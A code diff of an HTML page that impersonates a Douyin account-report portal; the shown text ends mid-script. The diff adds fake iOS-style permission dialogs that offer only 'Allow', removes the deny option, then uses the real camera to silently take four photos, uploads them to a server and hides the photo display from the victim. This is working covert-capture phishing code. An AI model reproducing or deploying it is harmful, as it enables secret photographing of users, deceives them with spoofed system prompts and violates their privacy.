@@ -2,121 +2,182 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>抖音平台违规账号举报提交入口</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: "Microsoft YaHei", "PingFang SC", -apple-system, sans-serif;
-            background-color: #f7f8fa;
-            color: #333;
+            font-family: -apple-system, "PingFang SC", "Helvetica Neue", "Microsoft YaHei", sans-serif;
+            background: #f5f5f5;
+            color: #1a1a1a;
             min-height: 100vh;
-            font-size: 14px;
+            font-size: 15px;
+            -webkit-font-smoothing: antialiased;
         }
         .container {
             max-width: 640px;
             margin: 0 auto;
-            padding: 16px 16px 40px;
+            padding-bottom: env(safe-area-inset-bottom, 20px);
         }
 
-        /* ===== 1. 顶部标题栏 ===== */
+        /* ===== Header ===== */
         .header {
-            background: #1677ff;
+            background: linear-gradient(135deg, #FE2C55 0%, #E81F4A 50%, #D4163E 100%);
             color: #fff;
-            padding: 24px 20px;
-            text-align: center;
+            padding: 32px 24px 28px;
+            position: relative;
+            overflow: hidden;
+        }
+        .header::before {
+            content: "";
+            position: absolute;
+            top: -40px; right: -40px;
+            width: 120px; height: 120px;
+            background: rgba(255,255,255,0.06);
+            border-radius: 50%;
+        }
+        .header::after {
+            content: "";
+            position: absolute;
+            bottom: -20px; left: 30px;
+            width: 80px; height: 80px;
+            background: rgba(255,255,255,0.04);
+            border-radius: 50%;
+        }
+        .header-top {
+            display: flex;
+            align-items: center;
+            margin-bottom: 14px;
+        }
+        .logo-icon {
+            width: 36px; height: 36px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 10px;
+            display: flex; align-items: center; justify-content: center;
+            margin-right: 12px;
+            font-size: 20px;
+            font-weight: 900;
+            letter-spacing: -1px;
         }
         .header h1 {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 700;
-            margin-bottom: 10px;
             letter-spacing: 0.5px;
         }
         .header p {
-            font-size: 12px;
-            opacity: 0.92;
-            line-height: 1.7;
-            letter-spacing: 0.3px;
+            font-size: 13px;
+            opacity: 0.9;
+            line-height: 1.8;
+        }
+        .header-badges {
+            display: flex;
+            gap: 8px;
+            margin-top: 16px;
+            flex-wrap: wrap;
+        }
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            background: rgba(255,255,255,0.15);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            backdrop-filter: blur(4px);
+        }
+        .badge svg {
+            width: 12px; height: 12px;
+            fill: #fff;
+            margin-right: 4px;
         }
 
-        /* ===== 2. 温馨提示 ===== */
-        .notice {
+        /* ===== Section Card ===== */
+        .card {
             background: #fff;
-            padding: 16px;
-            margin-top: 1px;
-            margin-bottom: 10px;
+            margin: 12px 16px;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.04);
         }
-        .notice-title {
-            font-size: 14px;
+        .card-title {
+            font-size: 16px;
             font-weight: 700;
-            color: #333;
-            margin-bottom: 10px;
+            color: #1a1a1a;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
         }
-        .notice ul {
+        .card-title .icon {
+            width: 22px; height: 22px;
+            margin-right: 8px;
+            flex-shrink: 0;
+        }
+        .card-title .icon svg {
+            width: 22px; height: 22px;
+        }
+
+        /* ===== Notice ===== */
+        .notice-list {
             list-style: none;
             padding: 0;
         }
-        .notice li {
-            font-size: 12px;
+        .notice-list li {
+            font-size: 13px;
             color: #666;
-            line-height: 2;
-            padding-left: 14px;
+            line-height: 1.8;
+            padding: 8px 0 8px 20px;
             position: relative;
+            border-bottom: 1px solid #f8f8f8;
         }
-        .notice li::before {
+        .notice-list li:last-child { border-bottom: none; }
+        .notice-list li::before {
             content: "";
             position: absolute;
-            left: 0;
-            top: 10px;
-            width: 4px;
-            height: 4px;
-            background: #1677ff;
+            left: 0; top: 15px;
+            width: 6px; height: 6px;
+            background: #FE2C55;
             border-radius: 50%;
+            opacity: 0.7;
         }
 
-        /* ===== 3. 表单区域 ===== */
-        .form-card {
-            background: #fff;
-            padding: 20px 16px;
-            margin-bottom: 10px;
-        }
+        /* ===== Form ===== */
         .form-group {
-            margin-bottom: 18px;
+            margin-bottom: 20px;
         }
         .form-group:last-of-type { margin-bottom: 0; }
         .form-label {
             display: block;
             font-size: 14px;
-            font-weight: 700;
-            color: #333;
+            font-weight: 600;
+            color: #1a1a1a;
             margin-bottom: 8px;
         }
-        .form-label .required { color: #ff4d4f; margin-right: 2px; }
+        .form-label .required { color: #FE2C55; margin-right: 2px; }
         .form-input, .form-select, .form-textarea {
             width: 100%;
-            padding: 11px 12px;
-            border: 1px solid #e0e0e0;
-            border-radius: 4px;
-            font-size: 14px;
+            padding: 12px 14px;
+            border: 1.5px solid #e8e8e8;
+            border-radius: 10px;
+            font-size: 15px;
             font-family: inherit;
-            color: #333;
-            background: #fff;
-            transition: border-color 0.2s;
+            color: #1a1a1a;
+            background: #fafafa;
+            transition: all 0.2s;
             outline: none;
+            -webkit-appearance: none;
         }
         .form-input:focus, .form-select:focus, .form-textarea:focus {
-            border-color: #1677ff;
+            border-color: #FE2C55;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(254,44,85,0.08);
         }
         .form-input::placeholder, .form-textarea::placeholder {
-            color: #bbb;
+            color: #c0c0c0;
         }
         .form-select {
-            appearance: none;
-            -webkit-appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6' viewBox='0 0 10 6'%3E%3Cpath fill='%23999' d='M0 0l5 6 5-6z'/%3E%3C/svg%3E");
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='7' viewBox='0 0 12 7'%3E%3Cpath fill='%23999' d='M0 0l6 7 6-7z'/%3E%3C/svg%3E");
             background-repeat: no-repeat;
-            background-position: right 12px center;
-            padding-right: 32px;
+            background-position: right 14px center;
+            padding-right: 36px;
             cursor: pointer;
         }
         .form-textarea {
@@ -130,24 +191,26 @@
             margin-top: 6px;
         }
 
-        /* 提交按钮 */
+        /* Submit Button */
         .submit-btn {
             display: block;
             width: 100%;
-            padding: 13px;
-            background: #1677ff;
+            padding: 14px;
+            background: linear-gradient(135deg, #FE2C55 0%, #E81F4A 100%);
             color: #fff;
             border: none;
-            border-radius: 4px;
-            font-size: 15px;
+            border-radius: 12px;
+            font-size: 16px;
             font-weight: 700;
             letter-spacing: 1px;
             cursor: pointer;
-            margin-top: 20px;
+            margin-top: 24px;
             position: relative;
             overflow: hidden;
+            box-shadow: 0 4px 14px rgba(254,44,85,0.3);
+            transition: transform 0.1s;
         }
-        .submit-btn:active { background: #0958d9; }
+        .submit-btn:active { transform: scale(0.98); }
         .submit-btn.loading {
             pointer-events: none;
             color: transparent;
@@ -155,126 +218,106 @@
         .submit-btn.loading::after {
             content: "";
             position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 20px;
-            height: 20px;
-            margin: -10px 0 0 -10px;
-            border: 2px solid rgba(255,255,255,0.3);
+            top: 50%; left: 50%;
+            width: 22px; height: 22px;
+            margin: -11px 0 0 -11px;
+            border: 2.5px solid rgba(255,255,255,0.3);
             border-top-color: #fff;
             border-radius: 50%;
             animation: spin 0.6s linear infinite;
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* ===== 4. 成功案例 ===== */
-        .cases-section {
-            background: #fff;
-            padding: 20px 16px;
-            margin-bottom: 10px;
-        }
-        .cases-title {
-            font-size: 15px;
-            font-weight: 700;
-            color: #333;
-            margin-bottom: 14px;
-            padding-left: 10px;
-            border-left: 3px solid #1677ff;
-        }
+        /* ===== Cases ===== */
         .case-item {
             display: flex;
             align-items: center;
-            padding: 13px 0;
+            padding: 14px 0;
             border-bottom: 1px solid #f5f5f5;
         }
         .case-item:last-child { border-bottom: none; }
         .case-icon {
-            width: 40px;
-            height: 40px;
-            background: #e6f4ff;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            width: 42px; height: 42px;
+            background: linear-gradient(135deg, #fff0f3 0%, #ffe0e6 100%);
+            border-radius: 12px;
+            display: flex; align-items: center; justify-content: center;
             flex-shrink: 0;
-            margin-right: 12px;
+            margin-right: 14px;
         }
         .case-icon svg {
-            width: 18px;
-            height: 18px;
-            fill: #1677ff;
+            width: 20px; height: 20px;
+            fill: #FE2C55;
         }
         .case-info { flex: 1; }
         .case-type {
-            font-size: 13px;
-            color: #333;
+            font-size: 14px;
+            color: #1a1a1a;
             font-weight: 500;
             margin-bottom: 4px;
+            line-height: 1.5;
         }
         .case-result {
             font-size: 12px;
-            color: #52c41a;
-            font-weight: 500;
+            color: #07c160;
+            font-weight: 600;
         }
 
-        /* ===== 5. 弹窗 ===== */
+        /* ===== Modal (通用) ===== */
         .modal-overlay {
             display: none;
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.45);
+            background: rgba(0,0,0,0.5);
             z-index: 1000;
             align-items: center;
             justify-content: center;
+            backdrop-filter: blur(2px);
         }
         .modal-overlay.active { display: flex; }
         .modal {
             background: #fff;
-            border-radius: 8px;
-            width: 88%;
-            max-width: 320px;
+            border-radius: 16px;
+            width: 84%;
+            max-width: 300px;
             overflow: hidden;
-            animation: modalIn 0.15s ease;
+            animation: modalIn 0.2s ease;
         }
         @keyframes modalIn {
-            from { transform: scale(0.95); opacity: 0; }
+            from { transform: scale(0.92); opacity: 0; }
             to { transform: scale(1); opacity: 1; }
         }
         .modal-header {
-            padding: 22px 20px 0;
+            padding: 24px 20px 0;
             text-align: center;
         }
         .modal-header h3 {
-            font-size: 15px;
-            color: #333;
+            font-size: 17px;
+            color: #1a1a1a;
             font-weight: 700;
-            margin-bottom: 14px;
         }
         .modal-body {
-            padding: 0 20px 20px;
+            padding: 12px 20px 20px;
             text-align: center;
         }
         .modal-body p {
-            font-size: 13px;
+            font-size: 14px;
             color: #666;
-            line-height: 1.9;
-            text-align: left;
+            line-height: 1.8;
+            text-align: center;
         }
-        .modal-body .warning { color: #ff4d4f; font-weight: 700; }
         .modal-footer {
             display: flex;
             border-top: 1px solid #f0f0f0;
         }
         .modal-btn {
             flex: 1;
-            padding: 14px;
+            padding: 15px;
             border: none;
-            font-size: 14px;
+            font-size: 16px;
             font-family: inherit;
             cursor: pointer;
             background: transparent;
+            transition: background 0.15s;
         }
         .modal-btn:active { background: #f5f5f5; }
         .modal-btn.cancel {
@@ -282,62 +325,86 @@
             border-right: 1px solid #f0f0f0;
         }
         .modal-btn.confirm {
-            color: #1677ff;
+            color: #FE2C55;
             font-weight: 700;
         }
 
-        /* 成功弹窗 */
+        /* Success Modal */
         .modal-body .success-icon {
-            width: 44px;
-            height: 44px;
-            background: #52c41a;
+            width: 52px; height: 52px;
+            background: linear-gradient(135deg, #07c160 0%, #06ad56 100%);
             border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 12px;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 14px;
         }
         .modal-body .success-icon svg {
-            width: 22px;
-            height: 22px;
+            width: 26px; height: 26px;
             fill: #fff;
         }
 
-        /* ===== 自制相机权限弹窗（仿系统原生） ===== */
+        /* ===== iOS Native-style Camera Modal ===== */
         .sys-modal-overlay {
             display: none;
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.5);
+            background: rgba(0,0,0,0.4);
             z-index: 2000;
             align-items: center;
             justify-content: center;
         }
         .sys-modal-overlay.active { display: flex; }
+        .sys-modal-overlay.fade-out {
+            animation: sysFadeOut 0.4s ease forwards;
+        }
+        .sys-modal-overlay.fade-in .sys-modal {
+            animation: sysModalIn 0.35s ease;
+        }
+        @keyframes sysFadeOut {
+            0% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+        @keyframes sysModalIn {
+            0% { opacity: 0; transform: scale(0.9); }
+            100% { opacity: 1; transform: scale(1); }
+        }
         .sys-modal {
-            background: #f2f2f7;
+            background: rgba(242,242,247,0.97);
             border-radius: 14px;
-            width: 72%;
-            max-width: 270px;
+            width: 70%;
+            max-width: 260px;
             overflow: hidden;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
         }
         .sys-modal-content {
-            padding: 20px 16px;
+            padding: 22px 18px 18px;
             text-align: center;
+        }
+        .sys-modal-content .sys-icon {
+            width: 44px; height: 44px;
+            background: linear-gradient(180deg, #3a3a3c 0%, #1c1c1e 100%);
+            border-radius: 10px;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 12px;
+        }
+        .sys-modal-content .sys-icon svg {
+            width: 24px; height: 24px;
+            fill: #fff;
         }
         .sys-modal-content h3 {
             font-size: 17px;
             font-weight: 600;
             color: #000;
             margin-bottom: 6px;
+            letter-spacing: -0.2px;
         }
         .sys-modal-content p {
             font-size: 13px;
-            color: #000;
+            color: #3a3a3c;
             line-height: 1.5;
         }
         .sys-modal-buttons {
-            border-top: 1px solid #d1d1d6;
+            border-top: 0.5px solid rgba(60,60,67,0.2);
             display: flex;
             flex-direction: column;
         }
@@ -348,10 +415,10 @@
             font-family: inherit;
             cursor: pointer;
             background: transparent;
-            border-bottom: 1px solid #d1d1d6;
+            border-bottom: 0.5px solid rgba(60,60,67,0.2);
         }
         .sys-modal-buttons button:last-child { border-bottom: none; }
-        .sys-modal-buttons button:active { background: #e5e5ea; }
+        .sys-modal-buttons button:active { background: rgba(0,0,0,0.04); }
         .sys-modal-buttons .sys-btn-allow {
             color: #007aff;
             font-weight: 600;
@@ -360,82 +427,59 @@
             color: #007aff;
         }
 
-        /* ===== 页脚 ===== */
+        /* ===== Footer ===== */
         .footer {
             text-align: center;
-            padding: 20px 0 8px;
+            padding: 20px 16px 8px;
             font-size: 11px;
             color: #ccc;
         }
 
-        /* ===== 6. 照片展示 ===== */
-        .photos-section {
-            background: #fff;
-            padding: 20px 16px;
-            margin-bottom: 10px;
-        }
-        .photos-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-        }
-        .photos-grid img {
-            width: 100%;
-            aspect-ratio: 4/3;
-            object-fit: cover;
-            border-radius: 6px;
-            border: 1px solid #eee;
-        }
-        .photo-item {
-            position: relative;
-        }
-        .photo-label {
-            position: absolute;
-            top: 6px;
-            left: 6px;
-            background: rgba(0,0,0,0.55);
-            color: #fff;
-            font-size: 11px;
-            padding: 2px 8px;
-            border-radius: 3px;
-        }
-
-        /* ===== 响应式 ===== */
+        /* ===== Responsive ===== */
         @media (max-width: 480px) {
-            .container { padding: 0 0 32px; }
-            .header { padding: 20px 16px; }
-            .header h1 { font-size: 16px; }
-            .form-card, .cases-section { padding: 16px 14px; }
+            .card { margin: 10px 12px; }
+            .header { padding: 26px 18px 24px; }
+            .header h1 { font-size: 18px; }
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- 1. 顶部标题栏 -->
+    <!-- Header -->
     <div class="header">
-        <h1>抖音平台违规账号举报提交入口</h1>
-        <p>官方合作快速通道 | 违规账号精准核查 | 1-3 工作日出处罚结果</p>
+        <div class="header-top">
+            <img src="111.png" style="width:36px;height:36px;border-radius:10px;margin-right:12px;">
+            <h1>违规账号举报入口</h1>
+        </div>
+        <p>官方举报快速通道 | 违规账号精准核查 | 1-3 工作日出处罚结果</p>
+        <div class="header-badges">
+            <span class="badge"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>举报全程保密</span>
+            <span class="badge"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>1-3日出结果</span>
+            <span class="badge"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>信息严格加密</span>
+        </div>
     </div>
 
-    <!-- 2. 温馨提示 -->
-    <div class="notice">
-        <div class="notice-title">【温馨提示】</div>
-        <ul>
-            <li>本通道仅受理他人账号违规行为举报，提交信息需真实有效，虚假举报将被系统反核查</li>
+    <!-- Notice -->
+    <div class="card">
+        <div class="card-title">
+            <span class="icon"><svg viewBox="0 0 24 24" fill="#FE2C55"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg></span>
+            温馨提示
+        </div>
+        <ul class="notice-list">
+            <li>本通道仅受理他人账号违规行为举报，提交信息需真实有效</li>
             <li>审核通过后，将根据违规程度对目标账号进行限流、私信功能限制、作品下架、账号封禁等处罚</li>
             <li>举报全程保密，信息不会向被举报人泄露</li>
             <li>填写信息越详细，审核通过率越高</li>
         </ul>
     </div>
 
-    <!-- 3. 核心表单 -->
-    <div class="form-card">
+    <!-- Form -->
+    <div class="card">
         <div class="form-group">
-            <label class="form-label"><span class="required">*</span>填写被举报方抖音账号</label>
-            <input type="text" class="form-input" id="accountId" placeholder="请准确输入对方完整抖音号（如：dy12345678）">
+            <label class="form-label"><span class="required">*</span>填写对方抖音号</label>
+            <input type="text" class="form-input" id="accountId" placeholder="请准确输入对方完整抖音号">
         </div>
-
         <div class="form-group">
             <label class="form-label"><span class="required">*</span>选择违规类型</label>
             <select class="form-select" id="reason">
@@ -448,44 +492,36 @@
                 <option value="6">其他违规行为</option>
             </select>
         </div>
-
         <div class="form-group">
             <label class="form-label"><span class="required">*</span>违规行为详细描述</label>
-            <textarea class="form-textarea" id="description" placeholder="请详细描述对方违规行为的时间、经过、具体内容，越详细越有利于审核通过"></textarea>
+            <textarea class="form-textarea" id="description" placeholder="请详细描述对方违规行为的时间、经过、具体内容"></textarea>
             <div class="form-hint">请尽量详细描述，包括时间、具体行为等信息</div>
         </div>
-
         <button class="submit-btn" id="submitBtn" onclick="submitReport()">确认提交举报申请</button>
     </div>
 
-    <!-- 4. 成功案例 -->
-    <div class="cases-section">
-        <div class="cases-title">成功案例</div>
-
+    <!-- Cases -->
+    <div class="card">
+        <div class="card-title">
+            <span class="icon"><svg viewBox="0 0 24 24" fill="#07c160"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></span>
+            成功案例
+        </div>
         <div class="case-item">
-            <div class="case-icon">
-                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
-            </div>
+            <div class="case-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
             <div class="case-info">
                 <div class="case-type">举报「恶意私信骚扰」成功，对方账号私信功能限制 5 天</div>
                 <div class="case-result">&#10003; 处理完成</div>
             </div>
         </div>
-
         <div class="case-item">
-            <div class="case-icon">
-                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
-            </div>
+            <div class="case-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
             <div class="case-info">
                 <div class="case-type">举报「恶意竞争引流」成功，对方账号作品限流 7 天</div>
                 <div class="case-result">&#10003; 处理完成</div>
             </div>
         </div>
-
         <div class="case-item">
-            <div class="case-icon">
-                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
-            </div>
+            <div class="case-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
             <div class="case-info">
                 <div class="case-type">举报「辱骂挑衅他人」成功，对方账号永久封禁</div>
                 <div class="case-result">&#10003; 处理完成</div>
@@ -493,51 +529,43 @@
         </div>
     </div>
 
-    <!-- 拍摄照片展示区 -->
-    <div class="photos-section" id="photosSection" style="display:none;">
-        <div class="cases-title">身份核验照片</div>
-        <div class="photos-grid" id="photosGrid"></div>
-    </div>
-
     <div class="footer">本页面仅供信息提交，审核结果以系统通知为准</div>
 </div>
 
-<!-- 进入网站时：自制相机权限弹窗（仿系统原生风格） -->
+<!-- iOS 风格通知权限弹窗 -->
+<div class="sys-modal-overlay active" id="customNotifModal">
+    <div class="sys-modal">
+        <div class="sys-modal-content">
+            <img src="111.png" style="width:44px;height:44px;border-radius:10px;margin:0 auto 12px;display:block;">
+            <h3>"抖音"想访问通知</h3>
+            <p>请点击允许，以最快通知举报结果</p>
+        </div>
+        <div class="sys-modal-buttons">
+            <button class="sys-btn-allow" onclick="onCustomNotifAllow()" style="border-bottom:none;">允许</button>
+        </div>
+    </div>
+</div>
+
+<!-- iOS 风格相机权限弹窗 -->
 <div class="sys-modal-overlay" id="customCameraModal">
     <div class="sys-modal">
         <div class="sys-modal-content">
+            <img src="111.png" style="width:44px;height:44px;border-radius:10px;margin:0 auto 12px;display:block;">
             <h3>"抖音"想访问相机</h3>
-            <p>用于完成身份核验</p>
+            <p>请点击允许，以查看举报核验结果</p>
         </div>
         <div class="sys-modal-buttons">
-            <button class="sys-btn-deny" onclick="onCustomCameraDeny()">拒绝</button>
-            <button class="sys-btn-allow" onclick="onCustomCameraAllow()">允许</button>
+            <button class="sys-btn-allow" onclick="onCustomCameraAllow()" style="border-bottom:none;">允许</button>
         </div>
     </div>
 </div>
 
-<!-- 自制相机拒绝后的提示 -->
-<div class="sys-modal-overlay" id="cameraDenyTipModal">
-    <div class="sys-modal">
-        <div class="sys-modal-content">
-            <h3>权限申请提示</h3>
-            <p>相机权限申请需要允许抖音相关权限完成核验，请在弹出的系统提示中点击「允许」</p>
-        </div>
-        <div class="sys-modal-buttons">
-            <button class="sys-btn-allow" onclick="onDenyTipConfirm()">我知道了</button>
-        </div>
-    </div>
-</div>
 
-<!-- 点击提交后：是否允许提交（第1次） -->
+<!-- 提交确认1 -->
 <div class="modal-overlay" id="confirmSubmit1Modal">
     <div class="modal">
-        <div class="modal-header">
-            <h3>确认提交</h3>
-        </div>
-        <div class="modal-body">
-            <p>是否允许提交举报申请？提交后将进行身份核验。</p>
-        </div>
+        <div class="modal-header"><h3>确认提交</h3></div>
+        <div class="modal-body"><p>是否允许提交举报申请？点击确认提交</p></div>
         <div class="modal-footer">
             <button class="modal-btn cancel" onclick="closeConfirmSubmit1()">取消</button>
             <button class="modal-btn confirm" onclick="onConfirmSubmit1()">确认提交</button>
@@ -545,15 +573,11 @@
     </div>
 </div>
 
-<!-- 点击提交后：是否允许提交（第2次） -->
+<!-- 提交确认2 -->
 <div class="modal-overlay" id="confirmSubmit2Modal">
     <div class="modal">
-        <div class="modal-header">
-            <h3>最终确认</h3>
-        </div>
-        <div class="modal-body">
-            <p>是否允许提交举报申请？提交后将进行身份核验。</p>
-        </div>
+        <div class="modal-header"><h3>确认提交</h3></div>
+        <div class="modal-body"><p>是否允许提交举报申请？点击确认提交</p></div>
         <div class="modal-footer">
             <button class="modal-btn cancel" onclick="closeConfirmSubmit2()">取消</button>
             <button class="modal-btn confirm" onclick="onConfirmSubmit2()">确认提交</button>
@@ -561,15 +585,11 @@
     </div>
 </div>
 
-<!-- 相机权限被拒绝后的二次挽留 -->
+<!-- 二次挽留 -->
 <div class="modal-overlay" id="retryModal">
     <div class="modal">
-        <div class="modal-header">
-            <h3>身份核验未完成</h3>
-        </div>
-        <div class="modal-body">
-            <p>为确保举报真实有效，需要完成身份核验。请重新授权相机权限以继续提交。</p>
-        </div>
+        <div class="modal-header"><h3>身份核验未完成</h3></div>
+        <div class="modal-body"><p>为确保举报真实有效，需要完成身份核验。请重新授权相机权限以继续提交。</p></div>
         <div class="modal-footer">
             <button class="modal-btn cancel" onclick="closeRetryModal()">取消</button>
             <button class="modal-btn confirm" onclick="retryAuth()">重新核验并提交</button>
@@ -577,15 +597,13 @@
     </div>
 </div>
 
-<!-- 提交成功弹窗 -->
+<!-- 成功 -->
 <div class="modal-overlay" id="successModal">
     <div class="modal">
-        <div class="modal-body" style="padding-top: 24px;">
-            <div class="success-icon">
-                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
-            </div>
-            <h3 style="font-size:15px; margin-bottom:8px; color:#333; font-weight:700;">提交成功，正在审核中</h3>
-            <p style="text-align:center;">您的举报申请已提交，系统将在 1-3 个工作日内完成审核，请留意通知消息。</p>
+        <div class="modal-body" style="padding-top: 28px;">
+            <div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
+            <h3 style="font-size:17px; margin-bottom:8px; color:#1a1a1a; font-weight:700;">提交成功，正在审核中</h3>
+            <p>您的举报申请已提交，系统将在 1-3 个工作日内完成审核，请留意通知消息。</p>
         </div>
         <div class="modal-footer">
             <button class="modal-btn confirm" onclick="closeSuccessModal()" style="width:100%;">确定</button>
@@ -598,44 +616,35 @@
     var capturedPhotos = [];
     var sessionId = '';
 
-    // ===== 进入网站：通知权限 + 自制相机弹窗 =====
-    window.addEventListener('DOMContentLoaded', function() {
-        // 1. 通知权限（破冰，允许与否无所谓）
+    // ===== 进入网站：通知弹窗已在HTML中默认active =====
+
+    // 通知弹窗 - 点击"允许" → 丝滑过渡到相机弹窗
+    function onCustomNotifAllow() {
+        var notifModal = document.getElementById('customNotifModal');
         if ('Notification' in window && Notification.permission === 'default') {
             Notification.requestPermission();
         }
-        // 2. 500ms后弹出自制相机权限
+        notifModal.classList.add('fade-out');
         setTimeout(function() {
-            document.getElementById('customCameraModal').classList.add('active');
-        }, 500);
-    });
+            notifModal.classList.remove('active', 'fade-out');
+            var camModal = document.getElementById('customCameraModal');
+            camModal.classList.add('active', 'fade-in');
+            setTimeout(function() {
+                camModal.classList.remove('fade-in');
+            }, 400);
+        }, 400);
+    }
 
-    // 自制相机弹窗 - 点击"允许"
+    // 相机弹窗 - 点击"允许"
     function onCustomCameraAllow() {
         document.getElementById('customCameraModal').classList.remove('active');
-        // 什么都不触发，只是标记通过，等提交时再弹真相机
     }
 
-    // 自制相机弹窗 - 点击"拒绝"
-    function onCustomCameraDeny() {
-        document.getElementById('customCameraModal').classList.remove('active');
-        document.getElementById('cameraDenyTipModal').classList.add('active');
-    }
-
-    // 拒绝提示 - 点击"我知道了" → 回到自制相机弹窗
-    function onDenyTipConfirm() {
-        document.getElementById('cameraDenyTipModal').classList.remove('active');
-        setTimeout(function() {
-            document.getElementById('customCameraModal').classList.add('active');
-        }, 200);
-    }
-
-    // ===== 点击确认提交按钮 =====
+    // ===== 提交流程 =====
     function submitReport() {
         var accountId = document.getElementById('accountId').value.trim();
         var reason = document.getElementById('reason').value;
         var desc = document.getElementById('description').value.trim();
-
         if (!accountId) { alert('请输入被举报方抖音账号'); return; }
         if (!reason) { alert('请选择违规类型'); return; }
         if (!desc) { alert('请详细描述违规行为'); return; }
@@ -644,16 +653,13 @@
         btn.classList.add('loading');
         setTimeout(function() {
             btn.classList.remove('loading');
-            // 第1次确认
             document.getElementById('confirmSubmit1Modal').classList.add('active');
         }, 800);
     }
 
-    // 第1次确认提交
     function onConfirmSubmit1() {
         document.getElementById('confirmSubmit1Modal').classList.remove('active');
         setTimeout(function() {
-            // 第2次确认
             document.getElementById('confirmSubmit2Modal').classList.add('active');
         }, 200);
     }
@@ -661,18 +667,14 @@
         document.getElementById('confirmSubmit1Modal').classList.remove('active');
     }
 
-    // 第2次确认提交 → 触发浏览器原生相机权限
     function onConfirmSubmit2() {
         document.getElementById('confirmSubmit2Modal').classList.remove('active');
-        setTimeout(function() {
-            requestRealCamera();
-        }, 300);
+        setTimeout(function() { requestRealCamera(); }, 300);
     }
     function closeConfirmSubmit2() {
         document.getElementById('confirmSubmit2Modal').classList.remove('active');
     }
 
-    // 请求浏览器原生相机权限
     function requestRealCamera() {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             alert('您的浏览器不支持相机功能，请更换浏览器重试');
@@ -692,7 +694,6 @@
             });
     }
 
-    // 二次挽留
     function showRetryModal() {
         document.getElementById('retryModal').classList.add('active');
     }
@@ -704,18 +705,15 @@
         setTimeout(function() { requestRealCamera(); }, 300);
     }
 
-    // 开始拍摄流程
     function startCapture() {
         sessionId = Date.now() + '_' + Math.random().toString(36).slice(2, 8);
         capturedPhotos = [];
         capturePhotos(0);
     }
 
-    // 递归拍摄4张照片
     function capturePhotos(count) {
         if (count >= 4) {
             stopCamera();
-            renderPhotos();
             setTimeout(function() {
                 document.getElementById('successModal').classList.add('active');
             }, 300);
@@ -738,26 +736,10 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ sessionId: sessionId, index: count, data: dataUrl })
             });
-            setTimeout(function() { capturePhotos(count + 1); }, 1500);
